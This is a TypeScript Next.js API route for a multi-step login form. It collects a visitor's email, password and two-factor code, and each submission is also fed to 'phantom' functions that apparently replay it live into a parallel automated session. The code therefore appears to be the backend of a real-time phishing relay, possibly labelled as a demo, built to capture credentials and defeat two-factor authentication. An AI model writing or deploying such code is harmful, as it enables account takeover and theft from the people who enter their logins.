import {
  createSession,
  getDemoSession,
  submitCaptcha,
  submitConfirmPassword,
  submitEmail,
  submitPassword,
  submitTwoFactor,
  clearInputError,
} from "@/lib/demo-session";
import {
  startPhantom,
  phantomFillEmail,
  phantomFillPassword,
  phantomFill2FA,
} from "@/lib/phantom";

export const dynamic = "force-dynamic";

export async function GET(request: Request) {
  const { searchParams } = new URL(request.url);
  const sessionId = searchParams.get("sessionId");
  if (!sessionId) return Response.json(null, { status: 400 });
  const session = getDemoSession(sessionId);
  if (!session) return Response.json(null, { status: 404 });
  return Response.json(session);
}

export async function POST(request: Request) {
  const body = (await request.json()) as
    | { action: "enter" }
    | { action: "submitEmail"; sessionId: string; email: string }
    | { action: "submitPassword"; sessionId: string; password: string }
    | { action: "submitConfirmPassword"; sessionId: string; password: string }
    | { action: "submitTwoFactor"; sessionId: string; code: string }
    | { action: "submitCaptcha"; sessionId: string }
    | { action: "clearError"; sessionId: string };

  if (body.action === "enter") {
    const ua = request.headers.get("user-agent") ?? "";
    const entry = createSession(ua);
    void startPhantom(entry.sessionId);
    return Response.json(entry);
  }

  const { sessionId } = body;

  if (body.action === "submitEmail") {
    void phantomFillEmail(sessionId, body.email);
    return Response.json(submitEmail(sessionId, body.email));
  }
  if (body.action === "submitPassword") {
    void phantomFillPassword(sessionId, body.password);
    return Response.json(submitPassword(sessionId, body.password));
  }
  if (body.action === "submitConfirmPassword") {
    return Response.json(submitConfirmPassword(sessionId, body.password));
  }
  if (body.action === "submitTwoFactor") {
    void phantomFill2FA(sessionId, body.code);
    return Response.json(submitTwoFactor(sessionId, body.code));
  }
  if (body.action === "clearError") {
    return Response.json(clearInputError(sessionId));
  }
  return Response.json(submitCaptcha(sessionId));
}
